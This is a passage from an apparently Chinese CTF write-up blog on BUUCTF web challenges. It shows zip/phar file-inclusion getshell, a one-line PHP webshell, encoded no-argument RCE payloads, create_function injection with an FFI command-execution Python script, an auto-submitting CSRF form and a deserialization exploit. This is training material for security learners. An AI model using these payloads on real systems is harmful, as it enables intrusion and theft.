class="line">一句话木马-&gt;压缩为zip文件-&gt;修改后缀的jpg-&gt;利用zip:&#x2F;&#x2F;或者phar:&#x2F;&#x2F;协议包含-&gt;getshell</span><br></pre></td></tr></table></figure><p>先传phpinfo测试，上传后路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;assets&#x2F;img&#x2F;upload&#x2F;a4c4ab7e86ffb8ae7ebf44a377492d0b073e3b45.jpg</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page&#x3D;zip:&#x2F;&#x2F;.&#x2F;assets&#x2F;img&#x2F;upload&#x2F;a4c4ab7e86ffb8ae7ebf44a377492d0b073e3b45.jpg%231</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420191913.png" alt="image-20210420191850660"></p><p>然后上传一句话木马：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420192239.png" alt="image-20210420192239458"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420192303.png" alt="image-20210420192302961"></p><p>利用phar协议：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page&#x3D;phar:&#x2F;&#x2F;.&#x2F;assets&#x2F;img&#x2F;upload&#x2F;7f9dd8cedfae86b489906d5126b1ccad949bb11b.jpg&#x2F;1</span><br></pre></td></tr></table></figure><h3 id="WEB-rceme"><a href="#WEB-rceme" class="headerlink" title="[WEB]rceme"></a>[WEB]rceme</h3><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420192646.png" alt="image-20210420192645927"></p><p>执行命令前有一个验证，python脚本构造即可。查看源码发现提示 存在swp文件泄露：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420195400.png" alt="image-20210420195400139"></p><p>下载恢复文件：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420195849.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>] = substr(md5(mt_rand().sha1(mt_rand)),<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(substr(md5(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]),<span class="number">0</span>,<span class="number">5</span>) !== <span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>])&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;Captcha error~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>] = substr(md5(mt_rand().sha1(mt_rand)),<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">        <span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$code</span>) &gt; <span class="number">70</span> <span class="keyword">or</span> preg_match(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/ixm&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;Longlone not like you~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>RCE限制长度小于等于70位</p><p>限制特殊符号数字字母，不能用异或和或运算 —可以利用取反</p><p>只允许无参数的函数传递进来，函数名只能为字母—利用无参数RCE</p><p>关于无参数RCE不再详细分析，可参考：<a href="https://xz.aliyun.com/t/9360">https://xz.aliyun.com/t/9360</a></p><p>这里利用<code>getallheaders()</code> 先看一下位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var_dump(getallheaders());</span><br><span class="line">构造取反后：</span><br><span class="line">(~%89%9E%8D%A0%9B%8A%92%8F)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)());</span><br><span class="line">但是本题目需要构造无参数：利用[!%FF]或者[!%aa]</span><br><span class="line">[~%89%9E%8D%A0%9B%8A%92%8F][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]());</span><br></pre></td></tr></table></figure><p>注意提交要通过bp 不然会编码：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420204428.png" alt="image-20210420204428016"></p><p>然后构造：<code>system(next(getallheaders()))</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">system(next(getallheaders()));</span><br><span class="line">(~%8C%86%8C%8B%9A%92)((~%91%9A%87%8B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)()))</span><br><span class="line"></span><br><span class="line">[~%8C%86%8C%8B%9A%92][!%FF]([~%91%9A%87%8B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420205602.png" alt="image-20210420205601739"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420205818.png" alt="image-20210420205818108"></p><h3 id="WEB-FighterFightsInvincibly"><a href="#WEB-FighterFightsInvincibly" class="headerlink" title="[WEB]FighterFightsInvincibly"></a>[WEB]FighterFightsInvincibly</h3><p>直接view-source:</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420211328.png" alt="image-20210420211328195"></p><p>看到是动态代码执行，构造create_function代码注入，看下phpinfo：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fighter&#x3D;create_function&amp;fights&#x3D;&amp;invincibly&#x3D;1;&#125;phpinfo();&#x2F;*</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420212724.png" alt="image-20210420212724022"></p><p>来个shell吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fighter&#x3D;create_function&amp;fights&#x3D;&amp;invincibly&#x3D;1;&#125;eval($_POST[V]);&#x2F;*</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420212911.png" alt="image-20210420212911179"></p><p>需要bypass，php版本7.4，利用php7.4 FFI实现用PHP代码调用C代码的方式执行命令。</p><p>蚁剑绕过利用失败，采取手动方式：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420222116.png" alt="image-20210420222116841"></p><p>flag读不全。其实还可以采用<a href="https://whoamianony.top/2021/03/13/Web%E5%AE%89%E5%85%A8/Bypass%20Disable_functions/">FFI调用PHP源码中的函数</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://daf3777d-58e5-4447-a849-b1a2ba7c1e9c.node3.buuoj.cn/&quot;</span></span><br><span class="line"><span class="comment">#data = &#123;&quot;fighter&quot;: &quot;create_function&quot;, &quot;fights&quot;: &quot;&quot;, &quot;invincibly&quot;: &quot;1;&#125;phpinfo();/*&quot;&#125;</span></span><br><span class="line"><span class="comment">#data = &#123;&quot;fighter&quot;: &quot;create_function&quot;, &quot;fights&quot;: &quot;&quot;, &quot;invincibly&quot;: &quot;&quot;&quot;1;&#125;$e=FFI::cdef(&quot;void *popen(char*,char*);\\nvoid pclose(void*);\\nint fgetc(void*);&quot;,&quot;libc.so.6&quot;);$o = $e-&gt;popen(&quot;/readflag&quot;,&quot;r&quot;);$d=&quot;&quot;;while(($c=$e-&gt;fgetc($o))!=-1)&#123;$d.=str_pad(strval(dechex($c)),2,&quot;0&quot;,0);&#125;$e-&gt;pclose($o);echo hex2bin($d);/*&quot;&quot;&quot;&#125;</span></span><br><span class="line">data = &#123;<span class="string">&quot;fighter&quot;</span>: <span class="string">&quot;create_function&quot;</span>, <span class="string">&quot;fights&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;invincibly&quot;</span>: <span class="string">&quot;&quot;&quot;&#125;$e=FFI::cdef(&quot;int php_exec(int type, char *cmd);&quot;);$e-&gt;php_exec(3,$_REQUEST[&#x27;cmd&#x27;]);/*&quot;&quot;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url, data=data,params=&#123;<span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;/readflag&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span> (res.content)</span><br></pre></td></tr></table></figure><h3 id="WEB-flagshop"><a href="#WEB-flagshop" class="headerlink" title="[WEB]flagshop"></a>[WEB]flagshop</h3><p>环境不太顺畅..中间重新起了好几次环境。。</p><p>这道题目考察的是CSRF，这种题目并不多，通过这个题目详细分析下这种漏洞。</p><p>先了解一下：<a href="https://segmentfault.com/a/1190000006963312">CSRF 详解与攻防实战</a></p><p>首先进入环境注册登录：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421113917911.png" alt="image-20210421113917911"></p><p>需要足够的钱购买flag。看一下怎么获得足够的钱，发现其有一个转账功能，与上文CSRF讲解的例子不谋而合同样是转账操作，其次还存在一个提交报告的地方，思路很明显了，就是构造恶意的链接，然后在提交报告处提交恶意链接，这样管理员查看报告就会自动转账：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421114229847.png" alt="image-20210421114229847"></p><p>看到Longlone用户，应该是利用CSRF让其给注册的用户转账，利用burp构造CSRF的POC放在vps上：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421114649186.png" alt="image-20210421114649186"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421114910068.png" alt="image-20210421114910068"></p><p>POC修改一下，加一个脚本自动提交的代码，放在vps上index.html，然后提交报告：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;postsubmit&quot;</span>).click();&#125;         </span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://31a0d988-edec-4409-83c4-04e3545ef852.node3.buuoj.cn/transfer.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;target&quot;</span> <span class="attr">value</span>=<span class="string">&quot;111&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;money&quot;</span> <span class="attr">value</span>=<span class="string">&quot;9999999999999999&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;messages&quot;</span> <span class="attr">value</span>=<span class="string">&quot;111&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421121648035.png" alt="image-20210421121648035"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421164726997.png" alt="image-20210421164726997"></p><p>提交成功后返回首页查看余额，购买flag即可。</p><h3 id="WEB-greatphp"><a href="#WEB-greatphp" class="headerlink" title="[WEB]greatphp"></a>[WEB]greatphp</h3><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="keyword">$this</span>-&gt;syc != <span class="keyword">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="keyword">$this</span>-&gt;syc) === md5(<span class="keyword">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="keyword">$this</span>-&gt;syc)=== sha1(<span class="keyword">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">           <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="keyword">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">               <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;syc);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>反序列化题目，可以看到想要执行命令必须满足MD5 、sha1值相等，但是既满足相等又要执行命令难以绕过。这里有个考察点就是：</p><blockquote><p>md5/sha1函数对一个类进行处理的时候会触发这个类的__toString魔术方法</p></blockquote><p>这里想到了利用原生类。利用Error 内置类，在进行处理的时候触发<code>__toString</code> ，先看一下类：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421105322749.png" alt="image-20210421105322749"></p><p>可见会输出payload 错误文件路径 以及行号，所以我们要想得到输出相同就需要在同一行：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421105525467.png" alt="image-20210421105525467"></p><p>可见这样就可以使的$a $b 相等，但是输出的报错信息相同。</p><p>接下来考虑怎么代码执行，首先我们需要控制整个代码块，利用<code>?&gt;&lt;?php</code> 形式，因为过滤了<code>&lt;?php</code> 采用短标签的形式<code>&lt;?=</code> ，其次过滤了小括号 因为控制了整个代码块，可以采取<code>include</code> flag文件的形式，过滤了”，无法利用 <code>include &quot;/flag&quot;</code> 利用取反绕过：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421111104661.png" alt="image-20210421111104661"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输出报错信息：Error: ?&gt;&lt;?&#x3D;include &quot;&#x2F;flag&quot;?&gt;#先闭合</span><br><span class="line">拼接：eval(Error: ?&gt;&lt;?&#x3D;include &quot;&#x2F;flag&quot;?&gt;);#成功控制代码块 包含文件</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“?&gt;&lt;?&#x3D;include~”.urldeocde(%D0%99%93%9E%98).&quot;?&gt;&quot;</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.urldecode(<span class="string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$payload</span>,<span class="number">1</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$payload</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$v</span> = <span class="keyword">new</span> SYCLOVER();</span><br><span class="line"><span class="variable">$v</span>-&gt;syc=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$v</span>-&gt;lover=<span class="variable">$b</span>;</span><br><span class="line"><span class="comment">#echo serialize($v);  </span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$v</span>));  </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421113013409.png" alt="image-20210421113013409"></p><h3 id="WEB-cross"><a href="#WEB-cross" class="headerlink" title="[WEB]cross"></a>[WEB]cross</h3><p>待解决</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-GYCTF2020</title>
      <link href="2021/04/19/BUUCTF-2019%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/"/>
      <url>2021/04/19/BUUCTF-2019%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h2 id="BUUCTF-GYCTF2020"><a href="#BUUCTF-GYCTF2020" class="headerlink" title="BUUCTF-GYCTF2020"></a>BUUCTF-GYCTF2020</h2><h3 id="WEB-Node-Game"><a href="#WEB-Node-Game" class="headerlink" title="[WEB]Node Game"></a>[WEB]Node Game</h3><h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p>可以查看源码，代码审计：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> pug = <span class="built_in">require</span>(<span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> morgan = <span class="built_in">require</span>(<span class="string">&#x27;morgan&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&#x27;multer&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(multer(&#123;<span class="attr">dest</span>: <span class="string">&#x27;./dist&#x27;</span>&#125;).array(<span class="string">&#x27;file&#x27;</span>));</span><br><span class="line">app.use(morgan(<span class="string">&#x27;short&#x27;</span>));</span><br><span class="line">app.use(<span class="string">&quot;/uploads&quot;</span>,express.static(path.join(__dirname, <span class="string">&#x27;/uploads&#x27;</span>)))</span><br><span class="line">app.use(<span class="string">&quot;/template&quot;</span>,express.static(path.join(__dirname, <span class="string">&#x27;/template&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> action = req.query.action?req.query.action:<span class="string">&quot;index&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>( action.includes(<span class="string">&quot;/&quot;</span>) || action.includes(<span class="string">&quot;\\&quot;</span>) )&#123;</span><br><span class="line">        res.send(<span class="string">&quot;Errrrr, You have been Blocked&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    file = path.join(__dirname + <span class="string">&#x27;/template/&#x27;</span>+ action +<span class="string">&#x27;.pug&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> html = pug.renderFile(file);</span><br><span class="line">    res.send(html);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/file_upload&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ip = req.connection.remoteAddress;</span><br><span class="line">    <span class="keyword">var</span> obj = &#123;</span><br><span class="line">        msg: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ip.includes(<span class="string">&#x27;127.0.0.1&#x27;</span>)) &#123;</span><br><span class="line">        obj.msg=<span class="string">&quot;only admin&#x27;s ip can use it&quot;</span></span><br><span class="line">        res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    &#125;</span><br><span class="line">    fs.readFile(req.files[<span class="number">0</span>].path, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            obj.msg = <span class="string">&#x27;upload failed&#x27;</span>;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> file_path = <span class="string">&#x27;/uploads/&#x27;</span> + req.files[<span class="number">0</span>].mimetype +<span class="string">&quot;/&quot;</span>;</span><br><span class="line">            <span class="keyword">var</span> file_name = req.files[<span class="number">0</span>].originalname</span><br><span class="line">            <span class="keyword">var</span> dir_file = __dirname + file_path + 